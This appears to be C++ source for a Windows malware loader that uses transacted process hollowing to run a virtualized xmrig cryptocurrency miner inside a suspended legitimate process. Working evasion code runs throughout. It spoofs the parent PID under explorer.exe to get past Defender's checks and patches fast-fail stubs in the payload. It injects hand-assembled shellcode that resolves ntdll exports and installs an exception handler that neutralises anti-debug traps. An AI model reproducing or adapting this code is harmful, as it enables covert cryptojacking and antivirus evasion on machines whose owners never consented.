#include <windows.h>
#include <tlhelp32.h>

#include <iostream>
#include <stdio.h>
#include <map>
#include <mutex>


#include "../include/ntddk.h"
#include "../include/kernel32_undoc.h"
#include "../include/util.h"
#include "../include/encryption.h"

#include "../include/process_info.h"
#include "../include/pe_hdrs_helper.h"
#include "../include/hollowing_parts.h"
#include "../include/delete_pending_file.h"
#include "../include/http_client.h"
#include "../include/json_printer.h"


// ── VEH anti-trap injection ─────────────────────────────────────────────
// The virtualized xmrig payload deliberately sets AC (bit18) and TF (bit8) in
// RFLAGS during execution as an anti-debug measure. Those raise continuous
// 0x80000002 (DATATYPE_MISALIGNMENT) / 0x80000004 (SINGLE_STEP) traps that the
// virtualizer's own (discarded) handler is absent to catch, so in the hollowed
// process they surface as unhandled exceptions -> thread termination.
//
// We inject a Vectored Exception Handler that clears AC+TF in the faulting
// context for those two codes and returns EXCEPTION_CONTINUE_EXECUTION, so the
// virtualizer's handler-exit sequence (popfq/pop rsp/jmp) can finish normally.

// x64 CONTEXT.EFlags offset
#define VEH_EFLAGS_OFF 0x44

// VEH handler machine code (x64):
//   mov  rdx,[rcx]          ; ExceptionRecord
//   mov  r8d,[rdx]          ; ExceptionCode
//   cmp  r8d,0x80000004     ; SINGLE_STEP
//   je   match
//   cmp  r8d,0x80000002     ; MISALIGNMENT
//   jne  miss
// match:
//   mov  rdx,[rcx+8]        ; ContextRecord
//   and  dword[rdx+0x44], 0xFFFBFBFF  ; clear TF+AC
//   mov  rax,-1             ; EXCEPTION_CONTINUE_EXECUTION
//   ret
// miss:
//   xor  eax,eax            ; EXCEPTION_CONTINUE_SEARCH
//   ret
static int build_veh_handler(unsigned char* p){
    int i=0;
    p[i++]=0x48; p[i++]=0x8b; p[i++]=0x11;             // mov rdx,[rcx]
    p[i++]=0x44; p[i++]=0x8b; p[i++]=0x02;             // mov r8d,[rdx]
    p[i++]=0x41; p[i++]=0x81; p[i++]=0xf8;             // cmp r8d,0x80000004
    p[i++]=0x04; p[i++]=0x00; p[i++]=0x00; p[i++]=0x80;
    p[i++]=0x74; p[i++]=0x09;                          // je +9 -> match(0x18)
    p[i++]=0x41; p[i++]=0x81; p[i++]=0xf8;             // cmp r8d,0x80000002
    p[i++]=0x02; p[i++]=0x00; p[i++]=0x00; p[i++]=0x80;
    p[i++]=0x75; p[i++]=0x16;                          // jne +22 -> miss(0x2e)
    p[i++]=0x48; p[i++]=0x8b; p[i++]=0x51; p[i++]=0x08;// mov rdx,[rcx+8]
    p[i++]=0x81; p[i++]=0xA2;                          // and dword[rdx+disp32],imm32
    p[i++]=VEH_EFLAGS_OFF; p[i++]=0x00; p[i++]=0x00; p[i++]=0x00;
    DWORD mask = ~((DWORD)((1<<8)|(1<<18)));
    p[i++]=mask&0xff; p[i++]=(mask>>8)&0xff; p[i++]=(mask>>16)&0xff; p[i++]=(mask>>24)&0xff;
    p[i++]=0x48; p[i++]=0xc7; p[i++]=0xc0;             // mov rax,-1
    p[i++]=0xff; p[i++]=0xff; p[i++]=0xff; p[i++]=0xff;
    p[i++]=0xc3;                                       // ret
    p[i++]=0x31; p[i++]=0xc0;                          // xor eax,eax
    p[i++]=0xc3;                                       // ret
    return i;
}

// Self-contained in-child bootstrap: resolves RtlAddVectoredExceptionHandler
// from the child's OWN ntdll (2nd module in InLoadOrderModuleList), then calls
// RtlAddVectoredExceptionHandler(First=1, HandlerAddr).
//
// ABI: obeys Microsoft x64 calling convention — saves/restores every nonvolatile
// register it uses (RBX, R13, R14, R15) and returns an explicit DWORD:
//   1  = RtlAddVectoredExceptionHandler was called successfully
//   0  = ntdll export not found or no export table (clean failure, no crash)
//
// Bytes [9..16] hold the 8-byte handler address patched by the host
// (7-byte prologue + 2-byte opcode prefix puts the immediate at offset 9).
//
// Layout (249 bytes total):
//  [0..6]    prologue : push rbx / push r13 / push r14 / push r15
//  [7..16]   mov rax, <handler_addr>  (immediate patched by host)
//  [17..19]  mov r15, rax
//  [20..43]  PEB walk -> ntdll DllBase in rax
//  [44..50]  lea rbx, [rip+0xa7]  -> string at offset 218
//  [51..65]  locate ExportDirectory, test for null
//  [66..71]  jz near -> failure_epilogue (offset 208)
//  [72..102] export table VA setup, loop init (xor ecx,ecx)
//  [103..105] cmp ecx, r8d  <- outer loop top
//  [106..111] jae near -> failure_epilogue (offset 208)
//  [112..125] load name VA, lea rbx -> string at offset 218
//  [126..160] inner byte-comparison loop
//  [161..194] match: resolve VA, call RtlAddVectoredExceptionHandler
//  [195..207] success_epilogue : mov eax,1 / pops / ret
//  [208..217] failure_epilogue : xor eax,eax / pops / ret
//  [218..248] "RtlAddVectoredExceptionHandler\0"
static const unsigned char boot_bin[] = {
    // ── Prologue: preserve nonvolatile registers (MS x64 ABI) ────────────
    0x53,                                           // push rbx
    0x41,0x55,                                      // push r13
    0x41,0x56,                                      // push r14
    0x41,0x57,                                      // push r15

    // ── Load handler address into r15 ────────────────────────────────────
    // Bytes [9..16] are patched by inject_veh() with the child-process VA of
    // the VEH handler function.
    0x48,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // mov rax, <handler_addr>
    0x49,0x89,0xc7,                                 // mov r15, rax

    // ── Locate ntdll: PEB -> Ldr -> 2nd InLoadOrder entry -> DllBase ─────
    0x65,0x48,0x8b,0x04,0x25,0x60,0x00,0x00,0x00,  // mov rax, gs:[0x60]       ; PEB
    0x48,0x8b,0x40,0x18,                            // mov rax, [rax+0x18]      ; PEB.Ldr
    0x48,0x8b,0x40,0x10,                            // mov rax, [rax+0x10]      ; Ldr.InLoadOrderModuleList.Flink
    0x48,0x8b,0x00,                                 // mov rax, [rax]           ; 1st entry flink (exe)
    0x48,0x8b,0x40,0x30,                            // mov rax, [rax+0x30]      ; ntdll DllBase

    // ── rbx = start of target function name string (offset 218) ──────────
    // RIP of next instruction = 51;  51 + 0xa7 (167) = 218
    0x48,0x8d,0x1d,0xa7,0x00,0x00,0x00,            // lea rbx, [rip+0xa7]

    // ── Walk ntdll export directory ───────────────────────────────────────
    0x8b,0x50,0x3c,                                 // mov edx, [rax+0x3c]      ; PE hdr offset
    0x48,0x8d,0x14,0x10,                            // lea rdx, [rax+rdx]       ; PE header VA
    0x8b,0x8a,0x88,0x00,0x00,0x00,                 // mov ecx, [rdx+0x88]      ; ExportDir RVA
    0x85,0xc9,                                      // test ecx, ecx

    // No export table -> return 0.  next=72;  72 + 136 (0x88) = 208 = failure_epilogue
    0x0f,0x84,0x88,0x00,0x00,0x00,                 // jz near <failure_epilogue>

    0x48,0x8d,0x14,0x08,                            // lea rdx, [rax+rcx]       ; ExportDir VA
    0x44,0x8b,0x42,0x18,                            // mov r8d,  [rdx+0x18]     ; NumberOfNames
    0x44,0x8b,0x5a,0x1c,                            // mov r11d, [rdx+0x1c]     ; AddressOfFunctions RVA
    0x49,0x01,0xc3,                                 // add r11, rax
    0x44,0x8b,0x4a,0x20,                            // mov r9d,  [rdx+0x20]     ; AddressOfNames RVA
    0x49,0x01,0xc1,                                 // add r9,  rax
    0x44,0x8b,0x52,0x24,                            // mov r10d, [rdx+0x24]     ; AddressOfNameOrdinals RVA
    0x49,0x01,0xc2,                                 // add r10, rax

    0x31,0xc9,                                      // xor ecx, ecx             ; loop index = 0

    // ── Outer loop: for (i = 0; i < NumberOfNames; ++i) ──────────────────
    // offset 103 = outer loop top (cmp)
    0x44,0x39,0xc1,                                 // cmp ecx, r8d
    // Name not found -> return 0.  next=112;  112 + 96 (0x60) = 208 = failure_epilogue
    0x0f,0x83,0x60,0x00,0x00,0x00,                 // jae near <failure_epilogue>

    0x41,0x8b,0x14,0x89,                            // mov edx, [r9+rcx*4]     ; name RVA
    0x48,0x01,0xc2,                                 // add rdx, rax             ; name VA

    // Reset rbx to start of target string for each outer iteration.
    // RIP of next instruction = 126;  126 + 92 (0x5c) = 218
    0x48,0x8d,0x1d,0x5c,0x00,0x00,0x00,            // lea rbx, [rip+0x5c]

    // ── Inner loop: byte-by-byte name comparison ──────────────────────────
    // offset 126 = inner loop top
    0x4c,0x0f,0xb6,0x32,                            // movzx r14, byte [rdx]   ; export name byte
    0x4c,0x0f,0xb6,0x2b,                            // movzx r13, byte [rbx]   ; target name byte
    0x45,0x84,0xf6,                                 // test r14b, r14b
    0x74,0x0d,                                      // jz +13  -> offset 152 (end-of-export check)
    0x4d,0x39,0xee,                                 // cmp r14, r13
    0x75,0x0d,                                      // jne +13 -> offset 157 (mismatch: inc ecx)
    0x48,0xff,0xc2,                                 // inc rdx
    0x48,0xff,0xc3,                                 // inc rbx
    0xeb,0xe6,                                      // jmp -26 -> offset 126 (inner loop top)

    // offset 152: export string ended — check target string also ended
    0x45,0x84,0xed,                                 // test r13b, r13b
    0x74,0x04,                                      // jz +4   -> offset 161 (match)

    // offset 157: mismatch — advance to next export
    0xff,0xc1,                                      // inc ecx
    0xeb,0xc6,                                      // jmp -58 -> offset 103 (outer loop cmp)

    // ── Match: resolve function VA via ordinal ────────────────────────────
    // offset 161
    0x49,0x0f,0xb7,0x14,0x4a,                      // movzx edx, word [r10+rcx*2]  ; ordinal
    0x41,0x8b,0x14,0x93,                            // mov edx,  [r11+rdx*4]         ; function RVA
    0x48,0x01,0xc2,                                 // add rdx, rax                   ; function VA
    0x49,0x89,0xd3,                                 // mov r11, rdx                   ; save (volatile)

    // ── Call RtlAddVectoredExceptionHandler(First=1, HandlerAddr) ─────────
    // RSP alignment after prologue (4 pushes = 32 bytes) + sub 0x28 (40):
    // thread-entry RSP%16==8, -32 => %16==8, -40 => %16==0 at CALL site ✓
    0xb9,0x01,0x00,0x00,0x00,                       // mov ecx, 1
    0x4c,0x89,0xfa,                                 // mov rdx, r15
    0x48,0x83,0xec,0x28,                            // sub rsp, 0x28
    0x41,0xff,0xd3,                                 // call r11
    0x48,0x83,0xc4,0x28,                            // add rsp, 0x28

    // ── Success epilogue (offset 195) ─────────────────────────────────────
    0xb8,0x01,0x00,0x00,0x00,                       // mov eax, 1   ; explicit success (fits 32-bit)
    0x41,0x5f,                                      // pop r15
    0x41,0x5e,                                      // pop r14
    0x41,0x5d,                                      // pop r13
    0x5b,                                           // pop rbx
    0xc3,                                           // ret

    // ── Failure epilogue (offset 208) ─────────────────────────────────────
    0x31,0xc0,                                      // xor eax, eax ; explicit failure
    0x41,0x5f,                                      // pop r15
    0x41,0x5e,                                      // pop r14
    0x41,0x5d,                                      // pop r13
    0x5b,                                           // pop rbx
    0xc3,                                           // ret

    // ── Target function name string (offset 218) ──────────────────────────
    // "RtlAddVectoredExceptionHandler\0"  (31 bytes)
    0x52,0x74,0x6c,0x41,0x64,0x64,0x56,0x65,0x63,0x74,
    0x6f,0x72,0x65,0x64,0x45,0x78,0x63,0x65,0x70,0x74,
    0x69,0x6f,0x6e,0x48,0x61,0x6e,0x64,0x6c,0x65,0x72,
    0x00
};

// Install a VEH into the suspended hollowed process BEFORE it is resumed. The
// bootstrap (resolver + install) runs on a remote thread and returns once the
// VEH is registered; we then resume the payload's main thread.
static bool inject_veh(PROCESS_INFORMATION& pi){
    SIZE_T total = 0x300;
    PVOID mem = VirtualAllocEx(pi.hProcess, NULL, total,
                               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(!mem) return false;

    unsigned char handler[64] = {0};
    int hlen = build_veh_handler(handler);

    unsigned char boot[300];
    memcpy(boot, boot_bin, sizeof(boot_bin));
    ULONG_PTR childHandler = (ULONG_PTR)mem + 0x100;
    // Patch bytes [9..16]: the 8-byte immediate of "mov rax, <handler_addr>".
    // The new boot_bin has a 7-byte prologue; the mov rax starts at byte 7
    // and its immediate begins at byte 9 (7 + sizeof opcode prefix 0x48 0xb8).
    for(int b=0;b<8;b++) boot[9+b]=(unsigned char)((childHandler>>(8*b))&0xff);

    SIZE_T written = 0;
    if(!WriteProcessMemory(pi.hProcess, mem, boot, sizeof(boot_bin), &written) ||
       written != sizeof(boot_bin)){
        std::cerr << "[ERROR] VEH bootstrap write failed (wrote " << written
                  << "/" << sizeof(boot_bin) << " bytes)" << std::endl;
        VirtualFreeEx(pi.hProcess, mem, 0, MEM_RELEASE);
        return false;
    }

    written = 0;
    if(!WriteProcessMemory(pi.hProcess, (BYTE*)mem + 0x100, handler, (SIZE_T)hlen, &written) ||
       written != (SIZE_T)hlen){
        std::cerr << "[ERROR] VEH handler write failed (wrote " << written
                  << "/" << hlen << " bytes)" << std::endl;
        VirtualFreeEx(pi.hProcess, mem, 0, MEM_RELEASE);
        return false;
    }

    HANDLE hth = CreateRemoteThread(pi.hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if(!hth){
        VirtualFreeEx(pi.hProcess, mem, 0, MEM_RELEASE);
        return false;
    }

    DWORD waitResult = WaitForSingleObject(hth, 5000);
    if(waitResult != WAIT_OBJECT_0){
        // Timed out or wait failed: kill the stray bootstrap thread before
        // freeing the memory it may still be executing.
        std::cerr << "[ERROR] VEH bootstrap thread did not finish in time (waitResult="
                  << waitResult << ")" << std::endl;
        TerminateThread(hth, 0);
        WaitForSingleObject(hth, 1000);
        CloseHandle(hth);
        VirtualFreeEx(pi.hProcess, mem, 0, MEM_RELEASE);
        return false;
    }

    DWORD thrCode = 0;
    GetExitCodeThread(hth, &thrCode);
    CloseHandle(hth);

    // Bootstrap returns explicit DWORD 1 on success, 0 on failure.
    // (The old blob returned the raw 64-bit handler pointer, truncated to 32 bits,
    // which was unreliable; the new ABI-compliant blob returns 1 or 0.)
    bool ok = (thrCode == 1);
    if(ok){
        // CRITICAL: the VEH handler lives at mem+0x100 and Windows will call it
        // whenever the payload traps. DO NOT free this block now — it must stay
        // allocated for the entire lifetime of the child. We track it in
        // ProcessStorage and free it only after the child is torn down.
        ProcessStorage::SetVehBlock(pi.dwProcessId, mem);
    } else {
        std::cerr << "[ERROR] VEH bootstrap returned failure code " << thrCode << std::endl;
        VirtualFreeEx(pi.hProcess, mem, 0, MEM_RELEASE);
    }
    return ok;
}


bool create_new_process_internal(PROCESS_INFORMATION &pi, LPWSTR targetPath, LPWSTR args = NULL, LPWSTR startDir = NULL)
{
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(STARTUPINFOW);
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    wchar_t cmdLine[MAX_PATH * 2] = {0};
    if (args != NULL && args[0] != L'\0') {
        swprintf_s(cmdLine, L"\"%s\" %s", targetPath, args);
    } else {
        swprintf_s(cmdLine, L"\"%s\"", targetPath);
    }

    // ── PPID spoofing: inherit parent PID from explorer.exe ──────────────
    // Defender's PsSetCreateProcessNotifyRoutineEx callback checks the parent;
    // processes created under explorer.exe are treated as trusted.
    HANDLE hParent = NULL;
    DWORD explorerPid = 0;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe = {};
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                    explorerPid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    if (explorerPid) {
        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPid);
    }

    SIZE_T attrListSize = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = nullptr;
    bool useAttr = (hParent != NULL);

    if (useAttr) {
        InitializeProcThreadAttributeList(nullptr, 1, 0, &attrListSize);
        pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);
        if (pAttrList) {
            if (!InitializeProcThreadAttributeList(pAttrList, 1, 0, &attrListSize) ||
                !UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    &hParent, sizeof(hParent), nullptr, nullptr)) {
                HeapFree(GetProcessHeap(), 0, pAttrList);
                pAttrList = nullptr;
                useAttr = false;
            }
        } else {
            useAttr = false;
        }
    }

    STARTUPINFOEXW siex = {};
    siex.StartupInfo.cb  = useAttr ? sizeof(STARTUPINFOEXW) : sizeof(STARTUPINFOW);
    siex.lpAttributeList = useAttr ? pAttrList : nullptr;

    DWORD flags = CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW;
    if (useAttr) flags |= EXTENDED_STARTUPINFO_PRESENT;

    BOOL ok = CreateProcessW(
        nullptr,
        cmdLine,
        nullptr, nullptr,
        FALSE,
        flags,
        nullptr,
        startDir,
        (LPSTARTUPINFOW)&siex,
        &pi
    );

    if (pAttrList) { DeleteProcThreadAttributeList(pAttrList); HeapFree(GetProcessHeap(), 0, pAttrList); }
    if (hParent)   { CloseHandle(hParent); }

    if (!ok) {
        printf("[ERROR] CreateProcessW (PPID spoof) failed, Error = %x\n", GetLastError());
        return false;
    }
    return true;
}

PVOID map_buffer_into_process(HANDLE hProcess, HANDLE hSection, ULONGLONG preferredBase)
{
    NTSTATUS status = STATUS_SUCCESS;
    SIZE_T viewSize = 0;
    PVOID sectionBaseAddress = 0;

    status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY);
    if (status != STATUS_SUCCESS) {
        std::cerr << "[ERROR] NtMapViewOfSection failed, status: " << std::hex << status << std::endl;
        return NULL;
    }

    // The protected payload is base-locked: its virtualizer sections carry baked
    // absolute addresses that the .reloc table does not cover (only .rdata/.data
    // are relocated). Running it anywhere but its preferred ImageBase makes the
    // virtualized code abort with STATUS_SINGLE_STEP. Treat any non-preferred
    // mapping address as a hard failure instead of warn-and-continue.
    if (preferredBase != 0 && (ULONGLONG)sectionBaseAddress != preferredBase) {
        std::cerr << "[ERROR] Payload mapped at 0x" << std::hex << (ULONGLONG)sectionBaseAddress
                  << ", expected 0x" << preferredBase
                  << ". Protected payload is base-locked (relocs cover only .rdata/.data)."
                  << std::dec << std::endl;
        return NULL;
    }

    std::cout << "Mapped Base:\t" << std::hex << (ULONG_PTR)sectionBaseAddress << "\n";
    std::cout << "View Size:\t" << std::hex << viewSize << "\n";
    return sectionBaseAddress;
}

DWORD transacted_hollowing(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize, LPWSTR args)
{
    wchar_t dummy_name[MAX_PATH] = { 0 };
    wchar_t temp_path[MAX_PATH] = { 0 };
    DWORD size = GetTempPathW(MAX_PATH, temp_path);
    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);
    HANDLE hSection = make_section_from_delete_pending_file(dummy_name, payladBuf, payloadSize);


    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        std::cout << "Creating transacted section has failed!\n";
        return false;
    }
    wchar_t *start_dir = NULL;
    wchar_t dir_path[MAX_PATH] = { 0 };
    get_directory(targetPath, dir_path, sizeof(dir_path));
    if (wcsnlen(dir_path, MAX_PATH) > 0) {
        start_dir = dir_path;
    }
    const int kMaxLaunchAttempts = 3;
    const ULONGLONG preferredBase = get_image_base(payladBuf);

    PROCESS_INFORMATION pi = { 0 };
    PVOID remote_base = nullptr;

    for (int attempt = 1; attempt <= kMaxLaunchAttempts; ++attempt) {
        if (!create_new_process_internal(pi, targetPath, args, start_dir)) {
            std::cerr << "Creating process failed!\n";
            return false;
        }

        std::cout << "Created Process, PID: " << std::dec << pi.dwProcessId << "\n";

        remote_base = map_buffer_into_process(pi.hProcess, hSection, preferredBase);
        if (remote_base) break;

        // Mapping failed: the victim's (randomized) image landed on the payload's
        // preferred base. Tear down this victim and relaunch a fresh one so the
        // payload gets its preferred base on the next attempt.
        std::cerr << "[-] Map attempt " << attempt << "/" << kMaxLaunchAttempts
                  << " failed; relaunching victim" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        pi = { 0 };
    }

    if (!remote_base) {
        std::cerr << "[-] Failed to map payload after " << kMaxLaunchAttempts << " attempts" << std::endl;
        CloseHandle(hSection);
        hSection = nullptr;
        return 0;
    }

    CloseHandle(hSection);
    hSection = nullptr;

    HANDLE hProcess = pi.hProcess;

    // Assign the hollow process to a Job Object with ActiveProcessLimit=1 so the
    // injected payload cannot spawn child processes (prevents double-notepad.exe).
    HANDLE hJob = CreateJobObjectW(NULL, NULL);
    if (hJob) {
        JOBOBJECT_BASIC_LIMIT_INFORMATION jobLimits = {};
        jobLimits.LimitFlags        = JOB_OBJECT_LIMIT_ACTIVE_PROCESS;
        jobLimits.ActiveProcessLimit = 1;
        SetInformationJobObject(hJob, JobObjectBasicLimitInformation, &jobLimits, sizeof(jobLimits));
        if (!AssignProcessToJobObject(hJob, hProcess)) {
            std::cerr << "[WARNING] Failed to assign process to job object: " << GetLastError() << "\n";
        }
        CloseHandle(hJob); // Job stays active until the process exits
    }
    bool isPayl32b = !pe_is64bit(payladBuf);
    if (!redirect_to_payload(payladBuf, remote_base, pi, isPayl32b)) {
        std::cerr << "Failed to redirect!\n";
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 0;
    }

    // NtMapViewOfSection and WriteProcessMemory are synchronous — no sleep needed.
    // FlushInstructionCache on a suspended process is a no-op but harmless.
    FlushInstructionCache(pi.hProcess, remote_base, payloadSize);

    // Patch DVM fast-fail stubs that fire as FAST_FAIL_STACK_COOKIE_CHECK_FAILURE (2)
    // when hollowed. The .text stubs at RVA 0x3d60f1 / 0x3d60f4 are `cd 29 c3` (int 29; ret)
    // reached via `mov ecx,2` / `mov ecx,8`. Patching them to `90 90` lets the
    // cookie check return via the following `ret`. Only those two are patched
    // to avoid breaking VM bytecode that also contains cd 29.
    if (!isPayl32b) {
        struct { DWORD rva; } targets[] = {{0x3d60f1}, {0x3d60f4}};
        int patched=0;
        for (auto &t: targets) {
            PVOID remoteAddr = (BYTE*)remote_base + t.rva;
            BYTE patch[2] = {0x90, 0x90};
            SIZE_T wr=0;
            BYTE cur[2]={0};
            if (ReadProcessMemory(pi.hProcess, remoteAddr, cur, 2, &wr) && wr==2 && cur[0]==0xCD && cur[1]==0x29) {
                if (WriteProcessMemory(pi.hProcess, remoteAddr, patch, 2, &wr) && wr==2) patched++;
            }
        }
        if (patched) std::cout<<"[+] Patched "<<patched<<" int29 stubs in .text\n";
        FlushInstructionCache(pi.hProcess, remote_base, payloadSize);
    }

    // Inject a VEH that clears the virtualizer's AC/TF anti-debug traps so the
    // hollowed payload survives the donation-timer / startup fault points.
    if (!isPayl32b) {
        if (!inject_veh(pi)) {
            std::cerr << "[WARNING] VEH injection failed (error " << GetLastError()
                      << "); payload may crash on AC/TF trap" << std::endl;
        } else {
            std::cout << "[+] VEH installed in hollowed process (clears AC/TF traps)" << std::endl;
        }
    }

    std::cout << "Resuming thread, PID " << std::dec << pi.dwProcessId << std::endl;

    if (!ResumeThread(pi.hThread)) {
        std::cerr << "Failed to resume thread! Error: " << GetLastError() << "\n";
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 0;
    }

    // Only register in ProcessStorage once the process is actually running.
    ProcessStorage::AddProcess(pi.dwProcessId, pi);
    std::cout << "Thread resumed successfully, payload executing...\n";
    return pi.dwProcessId;
}
